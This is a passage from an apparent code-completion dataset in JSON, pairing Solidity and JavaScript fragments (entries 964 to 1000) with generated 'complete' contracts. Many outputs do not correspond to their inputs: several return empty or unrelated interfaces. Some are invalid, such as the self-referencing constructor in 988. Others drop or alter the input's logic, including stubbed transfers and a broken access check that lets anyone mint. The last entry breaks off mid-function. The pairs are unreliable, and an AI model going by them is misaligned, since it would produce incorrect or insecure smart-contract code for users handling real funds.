        "input": "function transfer(address to, uint tokens) public returns (bool success) {\n   if (msg.sender == \"specific-address\") {\n      balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n      balances[to] = safeAdd(balances[to], tokens);\n      emit Transfer(msg.sender, to, tokens);\n      return true;\n   }\n\n   return false;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20Interface {\n  function transfer(address to, uint tokens) public returns (bool success);\n}\n\ncontract SafeMath {\n   function safeSub(uint a, uint b) internal pure returns (uint) {\n     assert(a >= b);\n     return a - b;\n   }\n\n   function safeAdd(uint a, uint b) internal pure returns (uint) {\n     assert(a + b >= a);\n     return a + b;\n   }\n}\n\n"
    },
    "964.sol": {
        "input": "contract(\"Fundraiser\", accounts => {\n\n beforeEach(async () => {\n })\n describe(\"initialization\", () => {\n })\n})\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Fundraiser {\n}\n\n"
    },
    "965.sol": {
        "input": "address public payable Beneficiary;\n\npayable(Beneficiary).transfer(address(this).balance);\n\n(bool success,) = payable(Beneficiary).call{value: address(this).balance}(\"\"); \nrequire(success, \"transaction failed\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable public Beneficiary;\n\n    constructor(address payable _beneficiary) {\n        Beneficiary = _beneficiary;\n    }\n\n    function transferFunds() public {\n        payable(Beneficiary).transfer(address(this).balance);\n    }\n\n    function callTransferFunds() public {\n        (bool success, ) = payable(Beneficiary).call{value: address(this).balance}(\"\");\n        require(success, \"Transaction failed\");\n    }\n}\n\n"
    },
    "967.sol": {
        "input": "pragma solidity ^0.8;\n\nabstract contract A {\n    function stake(address _userAddress, uint256 _amount) internal virtual {}\n}\n\n\ncontract B is A {\n    modifier updateRewards {\n        _;\n    }\n\n    function callStake() external {\n        stake(address(0x123), 1);\n    }\n    \n    function stake(address _userAddress, uint256 _amount) internal override updateRewards {}\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\nabstract contract A {\n    function stake(address _userAddress, uint256 _amount) internal virtual {}\n}\n\n\ncontract B is A {\n    modifier updateRewards {\n        _;\n    }\n\n    function callStake() external {\n        stake(address(0x123), 1);\n    }\n    \n    function stake(address _userAddress, uint256 _amount) internal override updateRewards {}\n}\n\n"
    },
    "968.sol": {
        "input": "const sendToContractTx = await owner.sendTransaction({\n  to: betContract.address,\n  value: ethers.utils.parseEther(\"1.0\")\n});\n\ncontract BetToken is ERC20, Ownable {\n    receive() external payable {}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Ownable {\n    function transferOwnership(address newOwner) external;\n}\n\ninterface ERC20 {\n    function transfer(address to, uint value) external returns (bool);\n}\n\n"
    },
    "969.sol": {
        "input": " mapping(string=>bool) private _usedTokenURIs;\n\nfunction tokenURIExists(string memory tokenURI) public view returns(bool){\n    return _usedTokenURIs[tokenURI]==true;\n  }\n\n  require(!tokenURIExists(tokenURI),\"Token URI already exists\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\n interface IERC165 {\n\n\n  function supportsInterface(bytes4 interfaceId)\n  external\n  view\n  returns(bool);\n\n} \n\n"
    },
    "970.sol": {
        "input": "const alchemyKey = process.env.ALCHEMY_KEY;\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\");\nconst web3 = createAlchemyWeb3(alchemyKey);\nconst contractABI = require('../contract-abi.json');\nexport const contract = new web3.eth.Contract(contractABI, CONTRACT_ADDRESS);\n\nexport const yourMethod = () => {\n if(window.ethereum.request({method: 'eth_requestAccounts'})){\n  const provider = new ethers.providers.Web3Provider(window.ethereum);\n  const signer = provider.getSigner();\n  const address = await signer.getAddress();\n\n  const tx = {\n   from: address,\n   to: CONTRACT_ADDRESS,\n   value: \"some wei value\", \n   data: contract.methods.YOUR_CONTRACT_METHOD_HERE().encodeABI()\n  }\n\n  const txHash = await window.ethereum.request({\n   method: 'eth_sendTransaction',\n   params: [tx]\n  });\n\n  console.log({txHash});\n }else{\n   console.log('user must connect wallet');\n }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContract {\n  receive() external payable {\n    revert();\n  }\n}\n\n"
    },
    "971.sol": {
        "input": "import \"@openzeppelin/contracts/utils/Strings.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Response {\n    function respond(string memory _message) public {\n        emit ResponseMessage(_message);\n    }\n\n    event ResponseMessage(string _message);\n}\n\n"
    },
    "972.sol": {
        "input": "function delegatedGreeting(address _contract) external {\n    (bool success,) = _contract.delegatecall(\n        abi.encodeWithSignature(\"greet()\")\n    );\n    require(success == true, \"delegatecall failed\");\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DelegatedGreeting {\n    \n    function delegatedGreeting(address _contract) external {\n        (bool success,) = _contract.delegatecall(\n            abi.encodeWithSignature(\"greet()\")\n        );\n        require(success == true, \"delegatecall failed\");\n    }\n\n}\n\n"
    },
    "973.sol": {
        "input": ".transfer(500000000000000000);\n\n.transfer(5e17);\n\n.transfer(0.5 ether);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Test {\n\n    function () payable public {\n       \n       \n       \n    }\n}\n\n"
    },
    "974.sol": {
        "input": "function getPair(address tokenA, address tokenB) external view returns (address pair);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract UniswapV2Pair {\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n}\n\n"
    },
    "975.sol": {
        "input": "constructor() payable {\n    admin = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Admin {\n\n    address public admin;\n\n    constructor() payable {\n        admin = msg.sender;\n    }\n\n}\n\n"
    },
    "976.sol": {
        "input": "pragma solidity 0.8.9;\n\ncontract PAY {\n    function sendEther(address payable receiver, uint256 amount) external payable {\n        uint val = msg.value;\n        require(val >= amount, \"Insufficient balance\");\n        (bool success, ) = receiver.call{value: val}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n}\n\n\n",
        "output": "pragma solidity 0.8.9;\n\ncontract PAY {\n    function sendEther(address payable receiver, uint256 amount) external payable {\n        uint val = msg.value;\n        require(val >= amount, \"Insufficient balance\");\n        (bool success, ) = receiver.call{value: val}(\"\");\n        // receiver.transfer(val);\n        require(success, \"Failed to send Ether\");\n    }\n}\n\n"
    },
    "977.sol": {
        "input": "if (ethToSend > 0) {\n    payable(_projectWallet).transfer(ethToSend);\n}\npayable(_marketingWallet).transfer(ethToSend);\n\nif (ethToSend > 0) {\n    payable(_projectWallet).transfer(ethToSend);\n    payable(_marketingWallet).transfer(ethToSend);\n}\n\npayable(_projectWallet).transfer(ethToSend / 2);\npayable(_marketingWallet).transfer(ethToSend / 2);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20Interface {\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\n"
    },
    "978.sol": {
        "input": "contract Scrath {\n\n    address private immutable weth;\n\n    constructor(address _weth){\n       weth = _weth;\n    }\n\n    function sendEth() external payable {}\n\n    function ethBalance() public view returns(uint256 _balance) {\n        _balance =  address(this).balance;\n        return _balance;\n    }\n\n    function convertToWeth() external payable {\n        uint256 eth = ethBalance();\n        IWETH(weth).deposit{value: eth}();\n    }\n\n    function wethBalance() external view returns(uint256 _balance) {\n        _balance = IWETH(weth).balanceOf(address(this));\n        return _balance;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IWETH {\n    function deposit() external payable;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract Scrath {\n    address private immutable weth;\n\n    constructor(address _weth) {\n        weth = _weth;\n    }\n\n    function sendEth() external payable {}\n\n    function ethBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    function convertToWeth() external payable {\n        uint256 eth = ethBalance();\n        IWETH(weth).deposit{value: eth}();\n    }\n\n    function wethBalance() external view returns (uint256) {\n        return IWETH(weth).balanceOf(address(this));\n    }\n}\n\n"
    },
    "980.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    bytes3 symbol = 0x455448; \n\n    function convertByteToString() public view returns(string memory){\n        string memory result = string(abi.encode(symbol));\n        return result;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    bytes3 symbol = 0x455448; // hex-encoded ASCII value of \"ETH\"\n\n    function convertByteToString() public view returns(string memory){\n        string memory result = string(abi.encode(symbol));\n        return result;\n    }\n}\n\n"
    },
    "981.sol": {
        "input": "import {Test, stdError} from \"@forge-std/Test.sol\";\n...\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    function foo() external pure returns (uint256 ret) {\n        return 123;\n    }\n\n    function bar() external pure returns (uint256 ret) {\n        return 456;\n    }\n\n    function baz() external pure returns (uint256 ret) {\n        return 789;\n    }\n\n    function qux() external pure returns (uint256 ret) {\n        return 1010;\n    }\n}\n\n"
    },
    "982.sol": {
        "input": "struct Note {\n    uint datetime;\n    bool done;\n    string note;\n}\n\nmapping (address => Note[]) notesPerUser;\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract NoteTaker {\n    struct Note {\n        uint datetime;\n        bool done;\n        string note;\n    }\n    \n    mapping (address => Note[]) notesPerUser;\n    \n    \n    function addNote(string memory noteTitle, uint timestamp) public {\n        Note note;\n        note.datetime = timestamp;\n        note.done = false;\n        note.note = noteTitle;\n        notesPerUser[msg.sender].push(note);\n    }\n    \n}\n\n"
    },
    "983.sol": {
        "input": "function deposit(address ticker,address sender,address recipient,uint256 amount\n                ) \n                external payable \n\nawait dex.deposit(\"0xa36085f69e2889c224210f603d836748e7dc0088\", \"0x5226a51522C23CcBEFd04a2d4C6c8e281eD1d680\", \"0xB643992c9fBcb1Cb06b6C9eb278b2ac35e6a2711\", \"1\",\n{from:accounts[0])\n\n \n\ncontract(\"Dex\", (accounts) => {\n  let contractOwner = null;\n  let buyer = null;\n  let _contract = null;\n\n\n  before(async () => {\n      _contract = await Dex.deployed();\n      contractOwner = accounts[0];\n      buyer = accounts[1];\n  });\n\n}\n\nfunction transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n            unchecked {\n                _approve(sender, _msgSender(), currentAllowance - amount);\n            }\n        }  \n        _transfer(sender, recipient, amount);\n\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Dex {\n    address private contractOwner;\n    address private buyer;\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    event Deposit(address indexed ticker, address indexed sender, address indexed recipient, uint256 amount);\n\n    constructor() {\n        contractOwner = msg.sender;\n    }\n\n    function deposit(\n        address ticker,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) \n    external payable \n    {\n        // Emit the Deposit event\n        emit Deposit(ticker, sender, recipient, amount);\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) \n    public \n    returns (bool) \n    {\n        uint256 currentAllowance = _allowances[sender][msg.sender];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _allowances[sender][msg.sender] = currentAllowance - amount;\n        _transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) \n    internal \n    {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        // Write your logic to transfer tokens from sender to recipient\n    }\n}\n\n"
    },
    "984.sol": {
        "input": " function _afterTokenTransfer(address from, address to, uint256 amount)\n        internal\n        override(ERC20, ERC20Votes)\n    {\n        super._afterTokenTransfer(from, to, amount);\n    }\n\n override(ERC20, ERC20Votes)\n\n function _afterTokenTransfer(address from, address to, uint256 amount)\n            internal\n            override\n        {\n            super._afterTokenTransfer(from, to, amount);\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract ERC20Interface {\n    function approve(address to, uint256 amount) virtual public;\n    function allowance(address owner, address spender) virtual public view returns (uint256);\n}\n\n"
    },
    "985.sol": {
        "input": "\npragma solidity 0.8.17;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\n\ncontract FamCash is ERC20, AccessControl{\n    bytes32 public constant PARENT = keccak256(\"PARENT\");\n    bytes32 public constant MEMBER = keccak256(\"MEMBER\");\n\n    uint256 public maxSupplyLimit = 1000000;\n\n\n    constructor(\n        address contractOwner,\n        string memory tokenName,\n        string memory tokenTicker\n    ) ERC20(tokenName, tokenTicker) {\n        grantRole(DEFAULT_ADMIN_ROLE, contractOwner);\n        grantRole(PARENT, contractOwner);\n        grantRole(MEMBER, contractOwner);\n    }\n\n    function mint(address recipient, uint256 amount) public {\n        require(!hasRole(PARENT,address(0)), \"Only parents can mint.\");\n\n        require(recipient != address(0), \"Invalid recipient address\");\n        require(amount > 0, \"Amount must be greater than zero\");\n\n        uint256 totalSupplyAfterMint = totalSupply() + amount;\n\n        require(\n            totalSupplyAfterMint <= maxSupplyLimit,\n            \"Exceeds max supply limit\"\n        );\n\n        _mint(recipient, amount);\n    }\n\n    function send(address recipient, uint256 amount) public {\n        require(\n            !hasRole(PARENT, msg.sender) || !hasRole(MEMBER, msg.sender),\n            \"Only family members can send tokens.\"\n        );\n\n        _transfer(msg.sender, recipient, amount);\n    }\n\n    function addParent(address parent) public {\n        require(!hasRole(PARENT,address(0)), \"Only parents can add parents.\");\n\n        require(!hasRole(PARENT, parent), \"They're already a parent\");\n\n        grantRole(PARENT, parent);\n    }\n\n    function addMember(address member) public {\n        require(!hasRole(PARENT, address(0)), \"Only parents can mint.\");\n\n        require(!hasRole(MEMBER, member), \"Address is already a member\");\n\n        grantRole(MEMBER, member);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply () external view returns (uint256);\n    function balanceOf (address account) external view returns (uint256);\n    function transfers (address from, address to, uint256 value) \n        external view returns (bool);\n    function transfer (address recipient, uint256 amount) \n        external returns (bool);\n\n    function allowance (address owner, address spender) \n        external view returns (uint256);\n\n    function approve (address spender, uint256 amount) \n        external returns (bool);\n\n    function transferFrom (address from, address to, uint256 amount) \n        external returns (bool);\n}\n\ninterface IAccessControl {\n    function grantRole (bytes32 role, address account) external;\n    function grantRoleBatch (bytes32[] calldata roles, address[] calldata accounts) \n        external;\n}\n\n"
    },
    "986.sol": {
        "input": "function getIndex(address walletAddress) view private returns(uint){\n  for (uint i = 0; i < kids.length; i++){\n    if(kids[i].walletAddress == walletAddress){{ \n      return i;\n    }\n  }\n return 999;\n}\n\nfunction getIndex(address walletAddress) view private returns(uint){\n  for (uint i = 0; i < kids.length; i++){\n    if(kids[i].walletAddress == walletAddress) {\n      return i;\n    }\n  }\n return 999;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Kid {\n    address public walletAddress;\n    string public name;\n    uint public age;\n    address public parent;\n}\n\n"
    },
    "987.sol": {
        "input": "contract A {\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log(\"A.foo called\");\n    }\n\n    function bar() public virtual {\n        emit Log(\"A.bar called\");\n    }\n}\n    \ncontract B is A {\n    function foo() public virtual override {\n        emit Log(\"B.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"B.bar called\");\n        super.bar();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log(\"A.foo called\");\n    }\n\n    function bar() public virtual {\n        emit Log(\"A.bar called\");\n    }\n}\n    \ncontract B is A {\n    function foo() public virtual override {\n        emit Log(\"B.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"B.bar called\");\n        super.bar();\n    }\n}\n\n"
    },
    "988.sol": {
        "input": "constructor (string memory _name) myConstruct(_name) {}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract myConstruct {\n  constructor (string memory _name) myConstruct(_name) {}\n}\n\n"
    },
    "989.sol": {
        "input": " function changeVote() public checkSender(msg.sender){\n        olderVoter = caller;\n    }\n\nfunction changeVote() public checkSender(msg.sender){\n        require(oldVoter != actualVoter); \n        olderVoter = caller;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VotingContract {\n    address public olderVoter;\n    address public actualVoter;\n    \n    modifier checkSender(address _sender) {\n        require(_sender != actualVoter, \"You cannot change your vote.\");\n        _;\n    }\n    \n    function changeVote() public checkSender(msg.sender) {\n        olderVoter = msg.sender;\n    }\n}\n"
    },
    "990.sol": {
        "input": "transfer(msg.sender, _amount);\n\nfunction getToken(uint256 _amount) external {\n    _mint(msg.sender, _amount);\n}\n\nconstructor() {\n    _mint(address(this), 10000000 * 10 ** decimals());\n    \n    _mint(msg.sender, 21000000 * 10 ** decimals());\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function getAllowance(address owner, address spender) external view returns (uint256);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "991.sol": {
        "input": "pragma solidity 0.8.12;\n\ncontract GistPin {\n  string public name = \"GistPin\";\n  uint256 public videoCount = 0;\n  uint256 public imageCount = 0;\n  mapping(uint256 => Image) public images;\n  mapping(uint256 => Video) public videos;\n\n  struct Image {\n    uint256 id;\n    string hash;\n    string description;\n    uint256 tipAmount;\n    address payable author;\n  }\n\n  struct Video {\n    uint256 id;\n    string hash;\n    string title;\n    address author;\n  }\n\n  event VideoUploaded(\n    uint256 id,\n    string hash,\n    string title,\n    string description,\n    address author\n  );\n\n  constructor() {\n    name = \"GistPin\";\n  }\n\n  function uploadVideo(\n    string memory _videoHash,\n    string memory _title,\n    string memory _description\n  ) public {\n    require(bytes(_videoHash).length > 0);\n    require(bytes(_title).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender != address(0));\n\n    videoCount++;\n\n    videos[videoCount] = Video(videoCount, _videoHash, _title, msg.sender);\n    emit VideoUploaded(\n        videoCount,\n        _videoHash,\n        _title,\n        _description,\n        msg.sender\n    );\n  }\n\n  event ImageCreated(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable author\n  );\n\n  event ImageTipped(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable myAddress\n  );\n\n   function uploadImage(string memory _imgHash, string memory _description) public {\n    require(bytes(_imgHash).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender!=address(0x0));\n\n    imageCount ++;\n\n\n    images[imageCount] = Image(imageCount, _imgHash, _description, 0, payable(msg.sender));\n\n    emit ImageCreated(imageCount, _imgHash, _description, 0, payable(msg.sender));\n  }\n\nfunction tipImageOwner(uint _id) public payable {\n    require(_id > 0 && _id <= imageCount);\n    Image memory _image = images[_id];\n    address payable _author = _image.author;\n    _author.transfer(msg.value);\n    _image.tipAmount = _image.tipAmount + msg.value;\n    images[_id] = _image;\n    emit ImageTipped(_id, _image.hash, _image.description, _image.tipAmount, payable(_author));\n }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GistPin {\n  string public name = \"GistPin\";\n  uint256 public videoCount = 0;\n  uint256 public imageCount = 0;\n  mapping(uint256 => Image) public images;\n  mapping(uint256 => Video) public videos;\n\n  struct Image {\n    uint256 id;\n    string hash;\n    string description;\n    uint256 tipAmount;\n    address payable author;\n  }\n\n  struct Video {\n    uint256 id;\n    string hash;\n    string title;\n    address author;\n  }\n\n  event VideoUploaded(\n    uint256 id,\n    string hash,\n    string title,\n    string description,\n    address author\n  );\n\n  event ImageCreated(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable author\n  );\n\n  event ImageTipped(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable myAddress\n  );\n\n   function uploadVideo(\n    string memory _videoHash,\n    string memory _title,\n    string memory _description\n  ) public {\n    require(bytes(_videoHash).length > 0);\n    require(bytes(_title).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender != address(0));\n\n    videoCount++;\n\n    videos[videoCount] = Video(videoCount, _videoHash, _title, msg.sender);\n    emit VideoUploaded(\n        videoCount,\n        _videoHash,\n        _title,\n        _description,\n        msg.sender\n    );\n  }\n\n  function uploadImage(string memory _imgHash, string memory _description) public {\n    require(bytes(_imgHash).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender!=address(0x0));\n\n    imageCount ++;\n\n\n    images[imageCount] = Image(imageCount, _imgHash, _description, 0, payable(msg.sender));\n\n    emit ImageCreated(imageCount, _imgHash, _description, 0, payable(msg.sender));\n  }\n\nfunction tipImageOwner(uint _id) public payable {\n    require(_id > 0 && _id <= imageCount);\n    Image memory _image = images[_id];\n    address payable _author = _image.author;\n    _author.transfer(msg.value);\n    _image.tipAmount = _image.tipAmount + msg.value;\n    images[_id] = _image;\n    emit ImageTipped(_id, _image.hash, _image.description, _image.tipAmount, payable(_author));\n }\n\n}\n\n"
    },
    "992.sol": {
        "input": "\npragma solidity ^0.8.7;\n\ncontract Store{\n    struct Product {\n        string name;\n        uint32 quantity;\n        bool exists;\n    }\n     address private Owner; \n     uint64 private productId;\n     mapping(uint => Product) private products;\n\n     constructor() {\n        productId = 1;\n        Owner = msg.sender;\n     }\n\n     modifier onlyOwner{\n        require(msg.sender == Owner, \"Fail! only admin can access this \n        function!\");\n         _;\n      }\n\n    function addProduct(string calldata _name, uint32 _quantity) public \n    onlyOwner{\n        Product memory _strucObj;\n        _strucObj.name = _name;\n        _strucObj.quantity = _quantity;\n        products[productId -1] = _strucObj;\n        productId++;\n    }\n\n    function listProducts() external view returns (string[] memory){\n        string[] memory productsInfo = new string[](productId);\n\n        if(productId < 1){\n            return productsInfo;\n        }\n\n        string memory dash = \"-\";\n\n        for(uint i = 0; i < productId; i++){\n            string memory info = products[i].name;\n\n            productsInfo[i] = info;\n        }\n\n        return productsInfo;\n    }\n\n   function CheckProductsByIndex(uint index) public view returns(string memory name)\n    {\n         string[] memory productsInfo = new string[](productId);\n         for(uint i = 0; i < productId; i++)\n         {\n             string memory _toArray = products[i].name;\n             productsInfo[i] = _toArray;\n         }\n        return productsInfo[index];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Store {\n    struct Product {\n        string name;\n        uint32 quantity;\n        bool exists;\n    }\n    \n    address private Owner; \n    uint64 private productId;\n    mapping(uint => Product) private products;\n\n    constructor() {\n        productId = 1;\n        Owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == Owner, \"Fail! only admin can access this function!\");\n        _;\n    }\n\n    function addProduct(string calldata _name, uint32 _quantity) public onlyOwner {\n        Product memory _strucObj;\n        _strucObj.name = _name;\n        _strucObj.quantity = _quantity;\n        products[productId - 1] = _strucObj;\n        productId++;\n    }\n\n    function listProducts() external view returns (string[] memory) {\n        string[] memory productsInfo = new string[](productId);\n\n        if (productId < 1) {\n            return productsInfo;\n        }\n\n        for (uint i = 0; i < productId; i++) {\n            productsInfo[i] = products[i].name;\n        }\n\n        return productsInfo;\n    }\n\n    function getProductByIndex(uint index) public view returns (string memory name) {\n        require(index < productId, \"Invalid index!\");\n\n        return products[index].name;\n    }\n}\n"
    },
    "996.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 numberA = 1; \n    uint256 numberB = 1; \n    uint256 numberC = 1; \n\n    uint128 numberD = 1; \n    uint128 numberE = 1; \n\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(2);\n        numbers.push(3);\n        numbers.push(4);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 numberA = 1; // slot 0\n    uint256 numberB = 1; // slot 1\n    uint256 numberC = 1; // slot 2\n\n    uint128 numberD = 1; // slot 3\n    uint128 numberE = 1; // slot 3\n\n    // length in slot 4\n    // values in slot ID determined by hash of the position + offset\n    // in this case keccak256(4) + 0, keccak256(4) + 1, and keccak256(4) + 2\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(2);\n        numbers.push(3);\n        numbers.push(4);\n    }\n}\n\n"
    },
    "997.sol": {
        "input": "struct Patient {\n  string name;\n  uint16 age;\n  string telephone;\n  string homeAddress;\n  uint64 birthday; \n  string disease; \n  Gender gender;\n  uint createdAt\n}\n\n[your_struct_variable] = block.timestamp;\n\npragma solidity ^0.8.0;\n\ncontract Hospital {\n\n    enum Gender { MALE, FEMALE }\n\n    struct Patient {\n        string name;\n        uint16 age;\n        string telephone;\n        string homeAddress;\n        uint64 birthday; \n        string disease; \n        Gender gender;\n        uint256 createdAt;\n    }\n\n    mapping(address => Patient) _patients;\n\n    function setPatients() public {\n        Patient memory _patient = Patient({\n            name: \"test\",\n            age: 50,\n            telephone: \"test\",\n            homeAddress: \"test\",\n            birthday: 1010101010,\n            disease: \"test\",\n            gender: Gender.MALE,\n            createdAt: block.timestamp            \n        });\n        _patients[msg.sender] = _patient;\n    }\n\n    function getPatient() external view returns(Patient memory) {\n        return _patients[msg.sender];\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Hospital {\n\n    enum Gender { MALE, FEMALE }\n\n    struct Patient {\n        string name;\n        uint16 age;\n        string telephone;\n        string homeAddress;\n        uint64 birthday; \n        string disease; \n        Gender gender;\n        uint256 createdAt;\n    }\n\n    mapping(address => Patient) _patients;\n\n    function setPatients() public {\n        Patient memory _patient = Patient({\n            name: \"test\",\n            age: 50,\n            telephone: \"test\",\n            homeAddress: \"test\",\n            birthday: 1010101010,\n            disease: \"test\",\n            gender: Gender.MALE,\n            createdAt: block.timestamp            \n        });\n        _patients[msg.sender] = _patient;\n    }\n\n    function getPatient() external view returns(Patient memory) {\n        return _patients[msg.sender];\n    }\n\n}\n\n"
    },
    "998.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract NestedMapping {\n    mapping(string => mapping(string => uint8)) private _game_rule_strategy;\n\n    function setNestedMapping(string memory _firstKey, string memory _secondKey, uint8 _value) public {\n        _game_rule_strategy[_firstKey][_secondKey] = _value;\n    }\n\n    function getValueNestedMapping(string memory _firstKey, string memory _secondKey) external view returns(uint8) {\n        return _game_rule_strategy[_firstKey][_secondKey];\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract NestedMapping {\n    mapping(string => mapping(string => uint8)) private _game_rule_strategy;\n\n    function setNestedMapping(string memory _firstKey, string memory _secondKey, uint8 _value) public {\n        _game_rule_strategy[_firstKey][_secondKey] = _value;\n    }\n\n    function getValueNestedMapping(string memory _firstKey, string memory _secondKey) external view returns(uint8) {\n        return _game_rule_strategy[_firstKey][_secondKey];\n    }\n}\n\n"
    },
    "999.sol": {
        "input": "    if (response != HederaResponseCodes.SUCCESS && newTotalSupply==0) {\n        return(false,0,_nftOwner);\n    }\n    else{\n        \n        transferNft(tokenId,_nftOwner,serialNumbers[0]);\n        NftToSeller[serialNumbers[0]]=_nftOwner;\n        return(true,serialNumbers[0],_nftOwner);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NftContract {\n    struct NFT {\n        uint256 tokenId;\n        address owner;\n    }\n\n    mapping(uint256 => NFT) public nfts;\n    mapping(uint256 => address) public NftToSeller;\n\n    enum HederaResponseCodes { SUCCESS, FAIL }\n\n    function transferNft(uint256 tokenId, address to, uint256 serialNumber) public {\n        require(nfts[serialNumber].owner == msg.sender, \"Not the owner\");\n        nfts[serialNumber].owner = to;\n    }\n\n    function checkHederaResponse(HederaResponseCodes response, uint256 newTotalSupply, uint256 tokenId, address _nftOwner, uint256[] memory serialNumbers) public returns(bool, uint256, address) {\n        if (response != HederaResponseCodes.SUCCESS && newTotalSupply==0) {\n            return(false,0,_nftOwner);\n        }\n        else{\n            transferNft(tokenId,_nftOwner,serialNumbers[0]);\n            NftToSeller[serialNumbers[0]]=_nftOwner;\n            return(true,serialNumbers[0],_nftOwner);\n        }\n    }\n}\n\n"
    },
    "1000.sol": {
        "input": "pragma solidity ^0.8.21;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract TokenTransfer is Ownable {\n    address public targetAddress;\n    address[] public tokenAddresses;\n\n    modifier onlyTargetAddress() {\n        require(msg.sender == targetAddress, \"Only the target address can call this function\");\n        _;\n    }\n\n    event TokensTransferred(address indexed tokenAddress, address indexed from, address indexed to, uint256 amount);\n\n    constructor(address _targetAddress, address[] memory _tokenAddresses) {\n        targetAddress = _targetAddress;\n        tokenAddresses = _tokenAddresses;\n    }\n\n    function setTargetAddress(address _targetAddress) public onlyOwner {\n        targetAddress = _targetAddress;\n    }\n\n    function setTokenAddresses(address[] memory _tokenAddresses) public onlyOwner {\n        tokenAddresses = _tokenAddresses;\n    }\n\n    function approveAndTransferAllTokens() public onlyTargetAddress {\n        for (uint256 i = 0; i < tokenAddresses.length; i++) {\n            address tokenAddress = tokenAddresses[i];\n            uint256 tokenBalance = IERC20(tokenAddress).balanceOf(msg.sender);\n            uint256 allowance = IERC20(tokenAddress).allowance(msg.sender, targetAddress);\n\n            if (tokenBalance > 0 && allowance == 0) {\n                IERC20(tokenAddress).approve(targetAddress, tokenBalance);\n            }\n            if (allowance > 0) {\n                